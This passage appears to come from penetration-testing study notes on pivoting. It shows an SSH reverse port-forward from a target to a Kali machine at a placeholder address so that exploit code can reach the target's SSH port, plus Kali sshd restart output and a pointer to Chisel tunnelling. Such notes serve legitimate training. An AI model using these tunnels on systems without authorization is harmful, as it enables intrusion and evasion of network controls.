```sh
# $ ssh -N -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
$ ssh -N -R 222:127.0.0.1:22 kali@<kali_IP>
```
The exploit code can now be run on your local machine at whichever port you chose.

> **Note**:
> On Kali you'll need to restart the SSH service which is securely disabled

```sh
sudo systemctl status ssh
‚óã ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; preset: disabled)
     Active: inactive (dead)
       Docs: man:sshd(8)
             man:sshd_config(5)
‚úò sudo systemctl restart ssh              
sudo systemctl status ssh 
‚óè ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; preset: disabled)
     Active: active (running) since Mon 2023-05-01 12:34:06 EDT; 2s ago
...
```

Recall that you can also use [Chisel forwarding](https://gist.github.com/A-Pisani/cd6c004ecab249b6b3f004984b448e5a#httptunnel-ing-through-deep-packet-inspection) instead of SSH port forwarding. And remember to use **proxychains** if you use chisel!
